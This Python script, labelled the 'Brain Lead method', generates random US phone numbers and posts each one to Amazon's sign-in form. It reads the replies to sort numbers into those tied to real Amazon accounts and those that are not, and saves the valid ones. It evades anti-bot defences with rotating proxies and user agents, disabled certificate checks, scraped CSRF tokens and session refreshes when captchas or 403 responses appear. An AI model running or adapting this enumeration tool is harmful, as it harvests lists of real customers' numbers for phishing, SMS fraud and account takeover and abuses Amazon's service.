#!/usr/bin/env python3
"""
Amazon US Number Generator + Validator (Brain Lead method)
===========================================================

Generates and validates US phone numbers on Amazon.com (or other marketplaces).
Saves only VALID numbers to the output file, prefixed with '+'.

Usage:
    python3 run.py --target-valid 10000
    python3 run.py --count 50000 --threads 60
    python3 run.py --proxies config/proxies.txt
    python3 run.py --test-session
"""

import argparse
import random
import re
import sys
import threading
import time
import urllib.parse
import urllib3

import requests

try:
    import urllib3.exceptions
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

# ------------------------------------------------------------------ config
DEFAULT_COUNT = 100_000
DEFAULT_THREADS = 50
MAX_RETRIES = 3
ROTATION_INTERVAL = 500
SESSION_TTL_HOURS = 12

OUT_DEFAULT = "valid_us_numbers.txt"

US_AREA_CODES = [
    201, 202, 203, 205, 206, 207, 208, 209, 210, 212, 213, 214, 215, 216, 217, 218, 219,
    220, 223, 224, 225, 228, 229, 231, 234, 239, 240, 248, 251, 252, 253, 254, 256, 260,
    262, 267, 269, 270, 272, 276, 281, 301, 302, 303, 304, 305, 308, 309, 310, 312, 313,
    314, 315, 316, 317, 318, 319, 320, 321, 323, 325, 326, 330, 331, 332, 334, 336, 337,
    339, 341, 346, 347, 351, 352, 360, 361, 364, 380, 385, 386, 401, 402, 404, 405, 406,
    407, 408, 409, 410, 412, 413, 414, 415, 417, 419, 423, 424, 425, 430, 432, 434, 435,
    440, 442, 443, 458, 469, 470, 475, 478, 479, 480, 484, 501, 502, 503, 504, 505, 507,
    508, 509, 510, 512, 513, 515, 516, 517, 518, 520, 530, 534, 539, 540, 541, 551, 559,
    561, 562, 563, 567, 570, 571, 573, 574, 575, 580, 585, 586, 601, 602, 603, 605, 606,
    607, 608, 609, 610, 612, 614, 615, 616, 617, 618, 619, 620, 623, 626, 628, 629, 630,
    631, 636, 641, 646, 650, 651, 657, 660, 661, 662, 667, 678, 681, 682, 701, 702, 703,
    704, 706, 707, 708, 712, 713, 714, 715, 716, 717, 718, 719, 720, 724, 725, 727, 731,
    732, 734, 737, 740, 743, 747, 754, 757, 760, 762, 763, 765, 769, 770, 772, 773, 774,
    775, 779, 781, 785, 786, 801, 802, 803, 804, 805, 806, 808, 810, 812, 813, 814, 815,
    816, 817, 818, 828, 830, 831, 832, 838, 843, 845, 847, 848, 850, 854, 856, 857, 858,
    859, 860, 862, 863, 864, 865, 870, 878, 901, 903, 904, 906, 907, 908, 909, 910, 912,
    913, 914, 915, 916, 917, 918, 919, 920, 925, 928, 929, 931, 934, 936, 937, 940, 941,
    947, 949, 951, 952, 954, 956, 959, 970, 971, 972, 973, 978, 979, 980, 984, 985, 989,
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/109.0 Firefox/119.0",
]

BOT_HINTS = [
    "robot check", "to discuss automated access", "enter the characters you see",
    "type the characters", "not a robot", "validateCaptcha",
]

STOP = threading.Event()


def log(msg):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), msg))


# --------------------------------------------------------------- generation
def generate_numbers(count):
    """Generate unique 11-digit NANP numbers (1 + area + exchange + line)."""
    codes = [str(c) for c in US_AREA_CODES]
    seen, out = set(), []
    attempts = 0
    while len(out) < count:
        attempts += 1
        if attempts > count * 20:
            break
        npa = random.choice(codes)
        nxx = str(random.randint(200, 999))
        line = "%04d" % random.randint(0, 9999)
        num = "1%s%s%s" % (npa, nxx, line)
        if num not in seen:
            seen.add(num)
            out.append(num)
    return out


# ------------------------------------------------------------------- proxies
class ProxyPool:
    def __init__(self, path=None):
        self.proxies = []
        self._i = 0
        self._lock = threading.Lock()
        if path:
            try:
                with open(path, encoding="utf-8") as f:
                    for raw in f:
                        p = raw.strip()
                        if not p or p.startswith("#"):
                            continue
                        self.proxies.append(self._format(p))
            except OSError as e:
                log("proxy file unreadable (%s) - running direct" % e)
        if self.proxies:
            log("loaded %d proxies" % len(self.proxies))

    @staticmethod
    def _format(p):
        parts = p.split(":")
        if len(parts) == 4:
            host, port, user, pwd = parts
            return "http://%s:%s@%s:%s" % (user, pwd, host, port)
        if "://" not in p:
            return "http://" + p
        return p

    def next(self):
        if not self.proxies:
            return None
        with self._lock:
            px = self.proxies[self._i % len(self.proxies)]
            self._i += 1
        return {"http": px, "https": px}


# ------------------------------------------------------------ session manager
class SessionManager:
    """Dynamic session & CSRF token manager (Brain Lead method)."""

    def __init__(self, domain="com", pool=None, timeout=15):
        tld = domain.split(".")[-1]
        self.base = "https://www.amazon.%s" % domain
        self.assoc = "inflex" if tld == "in" else "%s_flex" % tld
        self.page_id = "apflex" if tld != "in" else "inflex"
        self.pool = pool
        self.timeout = timeout
        self._lock = threading.Lock()
        self.session_data = None
        self.fetching_next = None
        self.counter = 0

    def _signin_url(self):
        q = urllib.parse.urlencode({
            "openid.pape.max_auth_age": "0",
            "openid.return_to": self.base + "/",
            "openid.identity":
                "http://specs.openid.net/auth/2.0/identifier_select",
            "openid.assoc_handle": self.assoc,
            "openid.mode": "checkid_setup",
            "openid.claimed_id":
                "http://specs.openid.net/auth/2.0/identifier_select",
            "openid.ns": "http://specs.openid.net/auth/2.0",
        })
        return self.base + "/ap/signin?" + q

    def _fetch_session(self):
        url = self._signin_url()
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Upgrade-Insecure-Requests": "1",
        }
        s = requests.Session()
        r1 = s.get(url, headers=headers, verify=False, timeout=self.timeout,
                   proxies=self.pool.next())
        if r1.status_code != 200:
            raise RuntimeError("initial GET HTTP %d" % r1.status_code)

        hidden = {}
        for pat in (r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"',
                    r'<input[^>]*name="([^"]+)"[^>]*type="hidden"[^>]*value="([^"]*)"'):
            for name, value in re.findall(pat, r1.text):
                hidden[name] = value
        hidden["email"] = "dummy@example.com"

        post_headers = dict(headers)
        post_headers.update({
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": self.base,
            "Referer": url,
        })
        r2 = s.post(url, headers=post_headers, data=hidden, verify=False,
                    timeout=self.timeout, allow_redirects=False,
                    proxies=self.pool.next())
        if r2.status_code not in (200, 302):
            raise RuntimeError("session POST HTTP %d" % r2.status_code)

        m = re.search(r'name="appActionToken"[^>]*value="([^"]+)"', r2.text) \
            or re.search(r'value="([^"]+)"[^>]*name="appActionToken"', r2.text)
        if not m:
            raise RuntimeError("no appActionToken served")
        return {"cookies": dict(s.cookies), "app_action_token": m.group(1),
                "timestamp": time.time()}

    def _background_fetch(self):
        try:
            new = self._fetch_session()
            with self._lock:
                self.fetching_next = new
        except Exception as e:
            log("session prefetch failed: %s" % str(e)[:80])
        finally:
            self._prefetching = False

    _prefetching = False

    def get(self):
        """Get current session; rotates every ROTATION_INTERVAL checks."""
        with self._lock:
            self.counter += 1
            if self.session_data is None:
                last_err = None
                for attempt in range(1, 5):          # extra retries for GitHub
                    try:
                        self.session_data = self._fetch_session()
                        log("session ready (token %s..., attempt %d)"
                            % (self.session_data["app_action_token"][:8], attempt))
                        return self.session_data
                    except Exception as e:
                        last_err = e
                        time.sleep(attempt * 3)
                raise RuntimeError("could not fetch Amazon session: %s" % last_err)

            if self.counter % ROTATION_INTERVAL == 0:
                if self.fetching_next:
                    self.session_data = self.fetching_next
                else:
                    try:
                        self.session_data = self._fetch_session()
                    except Exception as e:
                        log("rotation fetch failed, keeping session (%s)"
                            % str(e)[:60])
                self.fetching_next = None
            elif (self.counter % ROTATION_INTERVAL == ROTATION_INTERVAL // 2
                  and not self._prefetching and self.fetching_next is None):
                self._prefetching = True
                threading.Thread(target=self._background_fetch, daemon=True).start()

            return self.session_data

    def invalidate(self, reason=""):
        with self._lock:
            self.session_data = None
            self.fetching_next = None
            self.counter = 0
            self._prefetching = False
        log("session invalidated %s" % reason)


# -------------------------------------------------------------- classification
def classify(response):
    """Brain Lead decision chain + extended hints. Returns VALID/INVALID/UNKNOWN."""
    text = response.text.lower()
    final_url = str(getattr(response, "url", ""))

    if response.status_code == 403:
        return "UNKNOWN"
    if any(h in text for h in BOT_HINTS):
        return "UNKNOWN"

    # Brain Lead chain
    if "we cannot find an account with that email address" in text:
        return "INVALID"
    if "looks like you are new to amazon" in text:
        return "INVALID"
    if "create account" in text:
        return "INVALID"
    if "we cannot find an account with that mobile number" in text:
        return "INVALID"
    if "enter a valid email address or mobile number" in text:
        return "INVALID"
    if "this mobile number has not been in use with amazon for a while" in text:
        return "VALID"
    if "enter your password" in text or "ap_password" in text:
        return "VALID"
    if ("sorry, your passkey is not working" in text
            or "password reset required" in text):
        return "VALID"
    if "claim/intent" in final_url:
        return "INVALID"

    # Extended hints
    extra_invalid = ["couldn't find an account", "could not find an account",
                     "account does not exist", "we won't be able to"]
    if any(h in text for h in extra_invalid):
        return "INVALID"
    extra_valid = ["two-step verification", "verify your identity",
                   "one time password", "otp sent", "verification required",
                   "choose a delivery method", "sent to your phone"]
    if any(h in text for h in extra_valid):
        return "VALID"

    return "UNKNOWN"


# ------------------------------------------------------------------- checker
class Checker:
    def __init__(self, sm, pool=None):
        self.sm = sm
        self.pool = pool
        self.headers_base = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Te": "trailers",
        }

    def _check_once(self, num):
        sess = self.sm.get()
        headers = dict(self.headers_base)
        headers["User-Agent"] = random.choice(USER_AGENTS)
        headers["Origin"] = self.sm.base
        headers["Referer"] = self.sm._signin_url()

        data = {
            "openid.pape.max_auth_age": "0",
            "openid.return_to": self.sm.base + "/",
            "openid.assoc_handle": self.sm.assoc,
            "openid.mode": "checkid_setup",
            "openid.ns": "http://specs.openid.net/auth/2.0",
            "pageId": self.sm.page_id,
            "signInWithOTP": "true",
            "appAction": "SIGNIN_PWD_COLLECT",
            "appActionToken": sess["app_action_token"],
            "email": num,
            "redirectToUrl": "/ap/signin",
            "redirectMethod": "formSubmitPost",
            "subPageType": "SignInClaimCollect",
        }
        r = requests.post(self.sm.base + "/ap/signin", headers=headers,
                          data=data, cookies=sess["cookies"],
                          proxies=self.pool.next(), timeout=15,
                          verify=False, allow_redirects=True)
        verdict = classify(r)
        low = r.text.lower()
        if (verdict == "UNKNOWN" and r.status_code == 200
                and not any(h in low for h in BOT_HINTS)):
            self.sm.invalidate("(unexpected 200 content)")
        if verdict == "UNKNOWN" and r.status_code == 403:
            self.sm.invalidate("(403)")
        return verdict

    def check(self, num):
        last_error = None
        for attempt in range(MAX_RETRIES):
            if STOP.is_set():
                return "UNKNOWN"
            try:
                v = self._check_once(num)
                if v != "UNKNOWN":
                    return v
                last_error = "unexpected content"
            except Exception as e:
                last_error = str(e)
                self.sm.invalidate(f"({last_error})")
            time.sleep(0.5 * (attempt + 1))
        return "UNKNOWN"


# ------------------------------------------------------------------ file trimming
def trim_output_file(path, target):
    """Keep only the first `target` lines in the file."""
    if target is None:
        return
    try:
        with open(path, "r", encoding="utf-8") as f:
            lines = f.readlines()
        if len(lines) <= target:
            return
        with open(path, "w", encoding="utf-8") as f:
            f.writelines(lines[:target])
        log("Trimmed output file to exactly %d lines (removed %d extras)"
            % (target, len(lines) - target))
    except Exception as e:
        log("Failed to trim output file: %s" % e)


# ---------------------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser(
        description="Generate US numbers and validate them on Amazon "
                    "(Brain Lead method). Saves only VALID hits, prefixed with '+'.")
    ap.add_argument("--count", type=int, default=None,
                    help="total numbers to check (if not set, uses --target-valid * 20)")
    ap.add_argument("--target-valid", type=int, default=None,
                    help="stop after collecting this many valid numbers and trim output")
    ap.add_argument("--threads", type=int, default=DEFAULT_THREADS)
    ap.add_argument("--domain", default="in",
                    help="amazon marketplace: in, com, co.uk, de, ...")
    ap.add_argument("--out", default=OUT_DEFAULT)
    ap.add_argument("--proxies", help="proxy list file (optional)")
    ap.add_argument("--test-session", action="store_true",
                    help="fetch one Amazon session and exit")
    args = ap.parse_args()

    pool = ProxyPool(args.proxies)
    sm = SessionManager(args.domain, pool)

    if args.test_session:
        s = sm.get()
        log("OK token=%s cookies=%d"
            % (s["app_action_token"][:16], len(s["cookies"])))
        return 0

    # Determine how many numbers to generate
    if args.count is not None:
        total_numbers = args.count
    elif args.target_valid is not None:
        total_numbers = args.target_valid * 20   # ample buffer
    else:
        total_numbers = DEFAULT_COUNT

    if args.target_valid is None:
        target = None
    else:
        target = args.target_valid

    log("Generating up to %d unique US numbers (target valid = %s)"
        % (total_numbers, target if target is not None else "none"))
    numbers = generate_numbers(min(total_numbers, DEFAULT_COUNT * 10))
    log("Generated %d numbers (out of %d requested)" % (len(numbers), total_numbers))

    checker = Checker(sm, pool)
    out_lock = threading.Lock()
    stats = {"checked": 0, "VALID": 0, "INVALID": 0, "UNKNOWN": 0}
    stats_lock = threading.Lock()
    started = time.time()

    def worker(num):
        if STOP.is_set():
            return
        verdict = checker.check(num)
        with stats_lock:
            stats["checked"] += 1
            stats[verdict] += 1
            if verdict == "VALID":
                with out_lock:
                    with open(args.out, "a", encoding="utf-8") as f:
                        f.write("+" + num + "\n")   # add '+' prefix
                # If we have a target and reached it, signal stop
                if target is not None and stats["VALID"] >= target:
                    STOP.set()
            done = stats["checked"]
            if done % 25 == 0 or done == len(numbers):
                rate = done / max(1e-9, time.time() - started)
                suffix = f" target={target}" if target else ""
                print("\r[progress] %d/%d | valid %d | invalid %d | "
                      "unknown %d | %.1f/s%s"
                      % (done, len(numbers), stats["VALID"],
                         stats["INVALID"], stats["UNKNOWN"], rate, suffix),
                      end="", flush=True)

    log("starting validation: %d threads -> amazon.%s"
        % (args.threads, args.domain))
    try:
        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=max(1, args.threads)) as ex:
            futures = [ex.submit(worker, n) for n in numbers]
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception:
                    pass  # errors are already logged inside worker
                if STOP.is_set():
                    # Cancel remaining futures? They will finish quickly due to STOP check.
                    pass
    except KeyboardInterrupt:
        print()
        log("stopping (Ctrl+C)... finishing in-flight requests")
        STOP.set()

    print()
    elapsed = time.time() - started
    log("DONE in %dm%02ds - checked %d | VALID %d (saved to %s) | "
        "invalid %d | unknown %d"
        % (elapsed // 60, elapsed % 60,
           stats["checked"], stats["VALID"], args.out,
           stats["INVALID"], stats["UNKNOWN"]))

    # Trim the output file to exactly the target number of lines
    if target is not None:
        trim_output_file(args.out, target)

    return 0


if __name__ == "__main__":
    sys.exit(main())
